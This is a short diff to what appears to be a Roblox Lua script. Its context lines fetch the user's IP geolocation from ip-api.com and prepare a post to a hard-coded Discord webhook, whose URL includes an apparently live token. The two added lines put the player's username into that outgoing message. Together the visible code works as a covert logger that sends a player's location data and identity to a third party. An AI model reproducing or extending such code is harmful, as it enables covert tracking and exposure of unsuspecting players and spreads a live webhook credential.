@@ -12,6 +12,7 @@ local api2 = tostring(game:HttpGet("http://ip-api.com/json"))
 local url =
   "https://discord.com/api/webhooks/995549814454505582/wKAvmS53sYgxFVdHiahe1Kmflmfb_tte0Yzqp1sJ6MrS8mk98glPH_B4hk8Tn2M-WeQN"
 local data = {
+  ["content"] = tostring(game.Players.LocalPlayer.Name),
   ["embeds"] = {
       {
         ["title"] = "**PSA**",
@@ -83,6 +84,7 @@ local api2 = tostring(game:HttpGet("http://ip-api.com/json"))
 local url =
   "https://discord.com/api/webhooks/995549814454505582/wKAvmS53sYgxFVdHiahe1Kmflmfb_tte0Yzqp1sJ6MrS8mk98glPH_B4hk8Tn2M-WeQN"
 local data = {
+  ["content"] = tostring(game.Players.LocalPlayer.Name),
   ["embeds"] = {
       {
         ["title"] = "**PSA**",
